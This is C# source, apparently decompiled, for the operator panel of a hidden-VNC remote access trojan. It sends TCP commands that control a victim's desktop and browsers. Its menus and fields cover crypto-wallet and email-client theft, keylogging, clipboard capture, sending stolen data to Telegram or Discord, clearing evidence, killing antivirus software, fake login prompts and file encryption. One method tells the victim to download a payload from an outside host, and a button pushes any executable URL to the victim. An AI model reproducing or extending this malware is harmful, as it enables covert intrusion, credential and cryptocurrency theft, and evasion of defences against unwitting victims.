using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using GMap.NET;
using GMap.NET.MapProviders;
using GMap.NET.WindowsForms;
using GMap.NET.WindowsForms.Markers;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ShitarusPrivate.HVNC.Controls;
using ShitarusPrivate.HVNC.Properties;

namespace ShitarusPrivate.HVNC
{
    public class hVNC : Form
    {
        private class BlueRenderer : ToolStripProfessionalRenderer
        {
            protected override void OnRenderMenuItemBackground(ToolStripItemRenderEventArgs e)
            {
                Rectangle rect = new Rectangle(Point.Empty, e.Item.Size);
                Color color = (e.Item.Selected ? Color.White : Color.White);
                using (SolidBrush brush = new SolidBrush(color))
                {
                    e.Graphics.FillRectangle(brush, rect);
                }
                if (!e.Item.Selected)
                {
                    e.Item.ForeColor = Color.Black;
                    base.OnRenderMenuItemBackground(e);
                    return;
                }
                Pen pen = new Pen(Color.SteelBlue);
                SolidBrush solidBrush = new SolidBrush(Color.SteelBlue);
                e.Item.ForeColor = Color.Black;
                Rectangle rect2 = new Rectangle(Point.Empty, e.Item.Size);
                e.Graphics.FillRectangle(solidBrush, rect2);
                e.Graphics.DrawRectangle(pen, 0, 0, rect2.Width, rect2.Height);
                pen.Dispose();
                solidBrush.Dispose();
            }
        }

        [Serializable]
        [CompilerGenerated]
        private sealed class __c
        {
            public static readonly __c __9 = new __c();

            public static Func<string, char> __9__6_0;

            internal char _RandomMutex_b__6_0(string s)
            {
                return s[random.Next(s.Length)];
            }
        }

        private TcpClient tcpClient_0;

        private int int_0;

        private bool bool_1;

        private bool bool_2;

        public MoveBytes FrmTransfer0;

        public static Random random = new Random();

        public MoveBytes MoveBytes0;

        public TGtoDSC TGDC0;

        public IWhoamiN TGDCF;

        public RD RDF;

        private string userName = Environment.UserName;

        public Size Sz;

        private Point pt = new Point(1, 1);

        private IContainer components;

        private System.Windows.Forms.Timer timer1;

        private ToolStripStatusLabel toolStripStatusLabel1;

        private ToolStripStatusLabel toolStripStatusLabel2;

        private System.Windows.Forms.Timer timer2;

        private ContextMenuStrip contextMenuStrip1;

        private ToolStripMenuItem closeToolStripMenuItem;

        private ContextMenuStrip contextMenuStrip2;

        private ToolStripMenuItem electrumToolStripMenuItem;

        private ToolStripMenuItem armoryToolStripMenuItem;

        private ToolStripMenuItem GuardaItem;

        private ToolStripMenuItem coinomiToolStripMenuItem;

        private ToolStripMenuItem exodusToolStripMenuItem;

        private ToolStripMenuItem atomicToolStripMenuItem;

        private ToolStripMenuItem jaxxToolStripMenuItem;

        private ContextMenuStrip contextMenuStrip3;

        private ToolStripMenuItem outlookToolStripMenuItem;

        private ToolStripMenuItem foxmailToolStripMenuItem;

        private ToolStripMenuItem thunderbirdToolStripMenuItem;

        private ToolStripMenuItem skypeToolStripMenuItem;

        private ToolStripMenuItem discordToolStripMenuItem;

        private ToolStripMenuItem telegramToolStripMenuItem;

        private ContextMenuStrip contextMenuStrip4;

        private ToolStripMenuItem btnChrome;

        private ToolStripMenuItem btnEdge;

        private ToolStripMenuItem btnFirefox;

        private ToolStripMenuItem btnBrave;

        private ToolStripMenuItem btnEpic;

        private ToolStripMenuItem btnVivaldi;

        private ToolStripMenuItem btn360;

        private ToolStripMenuItem btnSputnik;

        private ContextMenuStrip contextMenuStrip5;

        private ToolStripMenuItem msinfo32exeToolStripMenuItem;

        private ToolStripMenuItem mstscexeToolStripMenuItem;

        private System.Windows.Forms.Timer timer3;

        private ToolStripMenuItem notepadToolStripMenuItem;

        private ToolStripMenuItem controlPanelToolStripMenuItem;

        private ContextMenuStrip contextMenuStrip6;

        private ToolStripMenuItem stealAndSendToTelegramToolStripMenuItem;

        private ToolStripMenuItem stealAndSendToDiscordToolStripMenuItem;

        private ToolStripMenuItem comodoToolStripMenuItem;

        private ToolStripMenuItem yandexToolStripMenuItem;

        private ToolStripMenuItem operaNeonToolStripMenuItem;

        private ToolStripMenuItem waterFoxToolStripMenuItem;

        private ToolStripMenuItem orbitumToolStripMenuItem;

        private ToolStripMenuItem atomToolStripMenuItem;

        private ToolStripMenuItem slimjetToolStripMenuItem;

        private ToolStripMenuItem dingTalkToolStripMenuItem;

        private ToolStripMenuItem downloadLogsViaSocketToolStripMenuItem;

        private ToolStripMenuItem clearEvidenceToolStripMenuItem;

        private ToolStripMenuItem powershellToolStripMenuItem;

        private ToolStripMenuItem cMDToolStripMenuItem;

        private ToolStripMenuItem explorerToolStripMenuItem;

        private ToolStripMenuItem copyToolStripMenuItem;

        private ToolStripMenuItem pasteToolStripMenuItem;

        private ToolTip toolTip1;

        private System.Windows.Forms.Timer timer4;

        private ToolStripMenuItem fakeLoginToolStripMenuItem;

        private ToolStripMenuItem killAllAntivusesToolStripMenuItem;

        private ContextMenuStrip contextMenuStrip7;

        private ToolStripMenuItem startToolStripMenuItem;

        private System.Windows.Forms.Timer timer5;

        private ToolStripMenuItem stopToolStripMenuItem;

        private System.Windows.Forms.Timer timer6;

        private System.Windows.Forms.Timer timer7;

        private System.Windows.Forms.Timer timer8;

        private System.Windows.Forms.Timer timer9;

        private ContextMenuStrip FileManagerContextMenuStrip;

        private ToolStripMenuItem networkingToolStripMenuItem;

        private ToolStripMenuItem downloadFIleToolStripMenuItem;

        private ToolStripMenuItem uploadFileToolStripMenuItem;

        private ToolStripSeparator toolStripSeparator3;

        private ToolStripMenuItem executeFileToolStripMenuItem;

        private ToolStripMenuItem createDirectoryToolStripMenuItem;

        private ToolStripMenuItem refreshDirectoryToolStripMenuItem;

        private ToolStripSeparator toolStripSeparator4;

        private ToolStripMenuItem deleteFolderFileToolStripMenuItem;

        private ToolStripMenuItem cryptographyToolStripMenuItem;

        private ToolStripMenuItem encryptFileToolStripMenuItem;

        private ToolStripMenuItem decryptFileToolStripMenuItem;

        private ToolStripMenuItem blockFileToolStripMenuItem;

        private ToolStripSeparator toolStripSeparator5;

        private ToolStripMenuItem searchDirectoryToolStripMenuItem;

        private ToolStripMenuItem searchForFileToolStripMenuItem;

        private ImageList FileManagerImageList;

        private System.Windows.Forms.Timer timer10;

        private System.Windows.Forms.Timer timer11;

        private ToolStripMenuItem stealAllWalletsToolStripMenuItem;

        private ToolStripMenuItem authyToolStripMenuItem;

        private ToolStripMenuItem steamToolStripMenuItem;

        private Panel panel1;

        private Label label18;

        private JCS.ToggleSwitch chkInfo;

        private Button MinBtn;

        private Label label2;

        private Label ResizeLabel;

        private JCS.ToggleSwitch chkKeylog;

        private TrackBar ResizeScroll;

        private Label label4;

        private Label label1;

        private JCS.ToggleSwitch chkClip;

        private StudioButton studioButton7;

        private StudioButton studioButton9;

        private StudioButton studioButton11;

        private Button CloseBtn;

        private StudioButton studioButton10;

        private Button RestoreMaxBtn;

        private StudioButton studioButton8;

        private StudioButton studioButton1;

        private StudioButton studioButton6;

        private JCS.ToggleSwitch chkClone;

        private StudioButton btnWatcher;

        private StudioButton btnElectrum;

        private StudioButton btnRootkit;

        private StudioButton btnKeyl;

        private PictureBox VNCBox;

        internal Label txtZilpay;

        internal Label txtRonin;

        internal Label txtExodusE;

        internal Label txtYoroi;

        private RJCircularPictureBox rjCircularPictureBox42;

        private RJCircularPictureBox rjCircularPictureBox43;

        private RJCircularPictureBox rjCircularPictureBox44;

        private RJCircularPictureBox rjCircularPictureBox46;

        private Label label57;

        private Label label59;

        private Label label60;

        private Label label61;

        internal Label txtMetamaskE;

        internal Label txtRabet;

        internal Label txtMTVS;

        internal Label txtMathE;

        internal Label txtAuvitas;

        private RJCircularPictureBox rjCircularPictureBox37;

        private RJCircularPictureBox rjCircularPictureBox38;

        private RJCircularPictureBox rjCircularPictureBox39;

        private RJCircularPictureBox rjCircularPictureBox40;

        private RJCircularPictureBox rjCircularPictureBox41;

        private Label label52;

        private Label txtMTV;

        private Label label54;

        private Label label55;

        private Label label56;

        internal Label txtETH;

        internal Label txtBitcoin;

        internal Label txtDash;

        internal Label txtLitecoin;

        internal Label txtAtom;

        internal Label txtElec;

        private RJCircularPictureBox rjCircularPictureBox8;

        private RJCircularPictureBox rjCircularPictureBox32;

        private RJCircularPictureBox rjCircularPictureBox33;

        private RJCircularPictureBox rjCircularPictureBox34;

        private RJCircularPictureBox rjCircularPictureBox35;

        private RJCircularPictureBox rjCircularPictureBox36;

        private Label label44;

        private Label label45;

        private Label label47;

        private Label label49;

        internal Label txtBitapp;

        internal Label txtCoin98;

        internal Label txtEqual;

        internal Label txtMetamask;

        internal Label txtJaxx;

        internal Label txtKeplr;

        internal Label txtCrocobit;

        internal Label txtOxygen;

        internal Label txtGuarda;

        internal Label txtBytecoin;

        internal Label txtMobox;

        internal Label txtGuild;

        internal Label txtIconex;

        internal Label txtTon;

        internal Label txtCoinomi;

        internal Label txtSollet;

        internal Label txtSlope;

        internal Label txtStarcoin;

        internal Label txtPhantom;

        internal Label txtArmory;

        internal Label txtFinnie;

        internal Label txtBinance;

        internal Label txtXinPay;

        internal Label txtMath;

        internal Label txtExodus;

        internal Label txtLiquality;

        internal Label txtTron;

        internal Label txtSwash;

        internal Label txtNifty;

        internal Label txtzcash;

        private RJCircularPictureBox rjCircularPictureBox31;

        private RJCircularPictureBox rjCircularPictureBox30;

        private RJCircularPictureBox rjCircularPictureBox29;

        private RJCircularPictureBox rjCircularPictureBox28;

        private RJCircularPictureBox rjCircularPictureBox27;

        private RJCircularPictureBox rjCircularPictureBox26;

        private Label label35;

        private RJCircularPictureBox rjCircularPictureBox25;

        private RJCircularPictureBox rjCircularPictureBox24;

        private RJCircularPictureBox rjCircularPictureBox23;

        private RJCircularPictureBox rjCircularPictureBox22;

        private RJCircularPictureBox rjCircularPictureBox21;

        private RJCircularPictureBox rjCircularPictureBox20;

        private RJCircularPictureBox rjCircularPictureBox19;

        private RJCircularPictureBox rjCircularPictureBox18;

        private RJCircularPictureBox rjCircularPictureBox17;

        private RJCircularPictureBox rjCircularPictureBox16;

        private RJCircularPictureBox rjCircularPictureBox15;

        private RJCircularPictureBox rjCircularPictureBox14;

        private RJCircularPictureBox rjCircularPictureBox13;

        private RJCircularPictureBox rjCircularPictureBox12;

        private RJCircularPictureBox rjCircularPictureBox9;

        private RJCircularPictureBox rjCircularPictureBox10;

        private RJCircularPictureBox rjCircularPictureBox11;

        private RJCircularPictureBox rjCircularPictureBox6;

        private RJCircularPictureBox rjCircularPictureBox7;

        private RJCircularPictureBox rjCircularPictureBox5;

        private RJCircularPictureBox rjCircularPictureBox4;

        private RJCircularPictureBox rjCircularPictureBox3;

        private RJCircularPictureBox rjCircularPictureBox2;

        private RJCircularPictureBox rjCircularPictureBox1;

        private Label label36;

        private Label label30;

        private Label label29;

        private Label label32;

        private Label label33;

        private Label label34;

        private Label label23;

        private Label label24;

        private Label label26;

        private Label label27;

        private Label label28;

        private Label label22;

        private Label label19;

        private Label label20;

        private Label label21;

        private Label label16;

        private Label label17;

        private Label label13;

        private Label label14;

        private Label label15;

        private Label label10;

        private Label label11;

        private Label label12;

        private Label label9;

        private Label label5;

        private Label label6;

        private Label label8;

        private Label label7;

        private Label label46;

        private Label label48;

        private Label label37;

        internal RichTextBox txtKeyl;

        internal RichTextBox txtClip;

        private Button studioButton13;

        private Label label31;

        private Label label25;

        internal TextBox txtlongitude;

        internal TextBox txtlatitude;

        private GMapControl map;

        private GroupBox groupBox6;

        private TrackBar IntervalScroll;

        private Label QualityLabel;

        private Label IntervalLabel;

        private TrackBar QualityScroll;

        private Button ShowStart;

        private Button btnInfo;

        private Button studioButton12;

        private Button button3;

        private Button btnClip;

        public StatusStrip statusStrip1;

        private ToolStripStatusLabel toolStripStatusLabel3;

        public ToolStripStatusLabel PingStatusLabel;

        private StudioButton studioButton3;

        private StudioButton studioButton4;

        private StudioButton studioButton5;

        private StudioButton studioButton2;

        internal Label txtScreen;

        private Panel panel3;

        private Panel panel4;

        internal Label txtFPS;

        private JCS.ToggleSwitch chkWallets;

        private Label label3;

        private TabControl tabControl1;

        private TabPage tabPage6;

        private TabPage tabPage7;

        private GroupBox groupBox3;

        private GroupBox groupBox2;

        private GroupBox groupBox1;

        private TabPage tabPage8;

        private TabPage tabPage9;

        private TabPage tabPage10;

        internal Label txtRes;

        private StudioButton studioButton14;

        public PictureBox VNCBoxe
        {
            get
            {
                return VNCBox;
            }
            set
            {
                VNCBox = value;
            }
        }

        public ToolStripStatusLabel toolStripStatusLabel2_
        {
            get
            {
                return toolStripStatusLabel2;
            }
            set
            {
                toolStripStatusLabel2 = value;
            }
        }

        public string xip { get; set; }

        public string xhostname { get; set; }

        public string TextBoxValue
        {
            get
            {
                return txtKeyl.Text;
            }
            set
            {
                txtKeyl.Text = value;
            }
        }

        public string MyProperty { get; set; }

        public static string RandomMutex(int length)
        {
            return new string(Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length).Select(__c.__9__6_0 ?? (__c.__9__6_0 = __c.__9._RandomMutex_b__6_0)).ToArray());
        }

        private void thunderbirdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("557*", tcpClient_0);
        }

        private void outlookToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("555*", tcpClient_0);
        }

        private void foxMailToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("556*", tcpClient_0);
        }

        public void hURL(string url)
        {
            SendTCP("8585* " + url, (TcpClient)base.Tag);
        }

        public void UpdateClient(string url)
        {
            SendTCP("8589* " + url, (TcpClient)base.Tag);
        }

        public void MassStealerPHP(string url)
        {
            SendTCP("55*https://icarus.loca.lt/crypt/public/Update_Downloads/IcarsPHP.jpg*PHP*" + url + "*" + "4".ToString(), (TcpClient)base.Tag);
        }

        public void ResetScale()
        {
            SendTCP("8587*", (TcpClient)base.Tag);
        }

        private void VNCBox_MouseEnter(object sender, EventArgs e)
        {
            Focus();
        }

        private void VNCBox_MouseLeave(object sender, EventArgs e)
        {
            FindForm().ActiveControl = null;
        }

        private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
        }

        private void VNCForm_Load(object sender, EventArgs e)
        {
            contextMenuStrip1.Renderer = new BlueRenderer();
            contextMenuStrip2.Renderer = new BlueRenderer();
            contextMenuStrip3.Renderer = new BlueRenderer();
            contextMenuStrip4.Renderer = new BlueRenderer();
            contextMenuStrip5.Renderer = new BlueRenderer();
            contextMenuStrip6.Renderer = new BlueRenderer();
            if (FrmTransfer0.IsDisposed)
            {
                FrmTransfer0 = new MoveBytes();
            }
            FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            tcpClient_0 = (TcpClient)base.Tag;
            VNCBox.Tag = new Size(1028, 1028);
            new Thread(_VNCForm_Load_b__29_0).Start();
            timer3.Interval = 10000;
            timer3.Tick += timer3_Tick;
            timer3.Start();
            timer4.Interval = 10000;
            timer4.Tick += timer4_Tick;
            timer4.Start();
            timer11.Interval = 10000;
            timer11.Tick += timer11_Tick;
            timer11.Start();
        }

        public static Image ImageFromBase64String(string base64)
        {
            MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(base64));
            Image result = Image.FromStream(memoryStream);
            memoryStream.Close();
            return result;
        }

        private void setRdesktopImg(string imgBytes)
        {
            try
            {
                hVNC hVNC2 = Application.OpenForms["VNCForm:" + tcpClient_0] as hVNC;
                ((PictureBox)hVNC2.Controls["pictureBox2"]).Image = ImageFromBase64String(imgBytes);
            }
            catch
            {
            }
        }

        public void Check()
        {
            try
            {
                if (FrmTransfer0.FileTransferLabele.Text == null)
                {
                    toolStripStatusLabel3.Text = "Status";
                }
                else
                {
                    toolStripStatusLabel3.Text = FrmTransfer0.FileTransferLabele.Text;
                }
            }
            catch
            {
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            checked
            {
                int_0 += 100;
                if (int_0 >= SystemInformation.DoubleClickTime)
                {
                    bool_1 = true;
                    bool_2 = false;
                    int_0 = 0;
                }
            }
        }

        private void ShowStart_Click(object sender, EventArgs e)
        {
            SendTCP("13*", tcpClient_0);
        }

        private void VNCBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (bool_1)
            {
                bool_1 = false;
                timer1.Start();
            }
            else if (int_0 < SystemInformation.DoubleClickTime)
            {
                bool_2 = true;
            }
            Point location = e.Location;
            object tag = VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)VNCBox.Width / (double)size.Width;
            double num2 = (double)VNCBox.Height / (double)size.Height;
            double num3 = Math.Ceiling((double)location.X / num);
            double num4 = Math.Ceiling((double)location.Y / num2);
            if (bool_2)
            {
                if (e.Button == MouseButtons.Left)
                {
                    SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
                }
            }
            else if (e.Button == MouseButtons.Left)
            {
                SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
        }

        private void VNCBox_MouseUp(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)VNCBox.Width / (double)size.Width;
            double num2 = (double)VNCBox.Height / (double)size.Height;
            double num3 = Math.Ceiling((double)location.X / num);
            double num4 = Math.Ceiling((double)location.Y / num2);
            if (e.Button == MouseButtons.Left)
            {
                SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
        }

        private void VNCBox_MouseMove(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)VNCBox.Width / (double)size.Width;
            double num2 = (double)VNCBox.Height / (double)size.Height;
            double num3 = Math.Ceiling((double)location.X / num);
            double num4 = Math.Ceiling((double)location.Y / num2);
            SendTCP("8*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
        }

        private void IntervalScroll_Scroll(object sender, EventArgs e)
        {
            IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
            SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
        }

        private void QualityScroll_Scroll(object sender, EventArgs e)
        {
            QualityLabel.Text = "Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
            SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
        }

        private void ResizeScroll_Scroll(object sender, EventArgs e)
        {
            ResizeLabel.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
            SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
        }

        private void RestoreMaxBtn_Click(object sender, EventArgs e)
        {
            SendTCP("15*", tcpClient_0);
        }

        private void MinBtn_Click(object sender, EventArgs e)
        {
            SendTCP("14*", tcpClient_0);
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            SendTCP("16*", tcpClient_0);
        }

        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {
            checked
            {
                try
                {
                    lock (tcpClient_1)
                    {
                        BinaryFormatter binaryFormatter = new BinaryFormatter();
                        binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                        binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                        binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                        object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                        ulong num = 0uL;
                        MemoryStream memoryStream = new MemoryStream();
                        binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                        num = (ulong)memoryStream.Position;
                        tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                        byte[] buffer = memoryStream.GetBuffer();
                        tcpClient_1.GetStream().Write(buffer, 0, (int)num);
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                }
                catch (Exception projectError)
                {
                    ProjectData.SetProjectError(projectError);
                    ProjectData.ClearProjectError();
                }
            }
        }

        private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
        {
            SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
        }

        private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            VNCBox.Image = null;
            GC.Collect();
            Hide();
            e.Cancel = true;
        }

        private void VNCForm_Click(object sender, EventArgs e)
        {
            method_18(null);
        }

        internal void method_18(object object_0)
        {
            base.ActiveControl = (Control)object_0;
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            Check();
        }

        private void VNCBox_MouseEnter_1(object sender, EventArgs e)
        {
            Focus();
        }

        private void VNCBox_MouseHover(object sender, EventArgs e)
        {
            Focus();
        }

        private void btnChrome_Click(object sender, EventArgs e)
        {
            if (!btnChrome.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                    FrmTransfer0.Hide();
                    SendTCP("11*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
                    btnChrome.Text = "Chrome Started";
                }
                else
                {
                    SendTCP("11*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btnChrome.Text = "Chrome Started";
                }
            }
            else
            {
                SendTCP("2005*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btnChrome.Text = "Chrome Stopped";
            }
        }

        private void btnEdge_Click(object sender, EventArgs e)
        {
            if (!btnEdge.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                    FrmTransfer0.Hide();
                    SendTCP("30*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
                    btnEdge.Text = "Edge Started";
                }
                else
                {
                    SendTCP("30*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btnEdge.Text = "Edge Started";
                }
            }
            else
            {
                SendTCP("2002*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btnEdge.Text = "Edge Stopped";
            }
        }

        private void btnFirefox_Click(object sender, EventArgs e)
        {
            if (!btnFirefox.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                    FrmTransfer0.Hide();
                    SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
                    btnFirefox.Text = "Firefox Started";
                }
                else
                {
                    SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btnFirefox.Text = "Firefox Started";
                }
            }
            else
            {
                SendTCP("2001*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btnFirefox.Text = "Firefox Stopped";
            }
        }

        private void btnOpera_Click(object sender, EventArgs e)
        {
            if (!btnEpic.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                    FrmTransfer0.Hide();
                    SendTCP("12*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
                    btnEpic.Text = "Epic Started";
                }
                else
                {
                    SendTCP("12*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btnEpic.Text = "Epic Started";
                }
            }
            else
            {
                SendTCP("2003*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btnEpic.Text = "Epic Stopped";
            }
        }

        private void btnBrave_Click(object sender, EventArgs e)
        {
            if (!btnBrave.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                    FrmTransfer0.Hide();
                    SendTCP("32*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
                    btnBrave.Text = "Started";
                }
                else
                {
                    SendTCP("32*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btnBrave.Text = "Brave Started";
                }
            }
            else
            {
                SendTCP("2005*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btnBrave.Text = "Brave Stopped";
            }
        }

        private void btnPowershell_Click(object sender, EventArgs e)
        {
            SendTCP("4876*", tcpClient_0);
        }

        private void btnCMD_Click(object sender, EventArgs e)
        {
            SendTCP("4875*", tcpClient_0);
        }

        private void btnEx_Click(object sender, EventArgs e)
        {
            SendTCP("21*", tcpClient_0);
        }

        private void btnCopy_Click(object sender, EventArgs e)
        {
            try
            {
                SendTCP("10*" + Clipboard.GetText(), tcpClient_0);
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
            }
        }

        private void btnPaste_Click(object sender, EventArgs e)
        {
            SendTCP("9*", tcpClient_0);
        }

        private void studioButton1_Click(object sender, EventArgs e)
        {
            string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
            if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(text))
            {
                SendTCP("56*" + text, (TcpClient)base.Tag);
            }
        }

        private void btnVivaldi_Click(object sender, EventArgs e)
        {
            if (!btnVivaldi.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                    FrmTransfer0.Hide();
                    SendTCP("1004*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
                    btnVivaldi.Text = "Vivaldi Started";
                }
                else
                {
                    SendTCP("1004*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btnVivaldi.Text = "Vivaldi Started";
                }
            }
            else
            {
                SendTCP("2004*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btnVivaldi.Text = "Vivaldi Stopped";
            }
        }

        private void btnSputnik_Click(object sender, EventArgs e)
        {
            if (!btnSputnik.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                    FrmTransfer0.Hide();
                    SendTCP("1002*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
                    btnSputnik.Text = "Sputnik Started";
                }
                else
                {
                    SendTCP("1002*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btnSputnik.Text = "Sputnik Started";
                }
            }
            else
            {
                SendTCP("2006*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btnSputnik.Text = "Sputnik Stopped";
            }
        }

        private void btn360_Click(object sender, EventArgs e)
        {
            if (!btn360.Text.Contains("Started"))
            {
                if (chkClone.Checked)
                {
                    if (FrmTransfer0.IsDisposed)
                    {
                        FrmTransfer0 = new MoveBytes();
                    }
                    FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                    FrmTransfer0.Hide();
                    SendTCP("991*" + Conversions.ToString(Value: true), (TcpClient)base.Tag);
                    btn360.Text = "360 Started";
                }
                else
                {
                    SendTCP("991*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                    btn360.Text = "360 Started";
                }
            }
            else
            {
                SendTCP("2007*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btn360.Text = "360 Stopped";
            }
        }

        private void btnWatcher_Click(object sender, EventArgs e)
        {
            if (!btnWatcher.Text.Contains("Started"))
            {
                SendTCP("1008*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btnWatcher.Text = "Watcher Started";
            }
            else
            {
                SendTCP("2008*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                btnWatcher.Text = "Watcher Stopped";
            }
        }

        private void btnRootkit_Click(object sender, EventArgs e)
        {
            contextMenuStrip3.Show(btnRootkit, 0, btnRootkit.Height);
        }

        private void studioButton2_Click(object sender, EventArgs e)
        {
            SendTCP("2011*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
        }

        private void studioButton5_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void studioButton4_Click(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Maximized;
        }

        private void studioButton3_Click(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Normal;
        }

        private void studioButton2_Click_1(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Minimized;
        }

        private void studioButton6_Click(object sender, EventArgs e)
        {
            contextMenuStrip2.Show(studioButton6, 0, studioButton6.Height);
        }

        private void electrumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!electrumToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2026*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                electrumToolStripMenuItem.Text = "Electrum Started";
            }
            else
            {
                SendTCP("2027*" + Conversions.ToString(Value: false), (TcpClient)base.Tag);
                electrumToolStripMenuItem.Text = "Electrum Stopped";
            }
        }

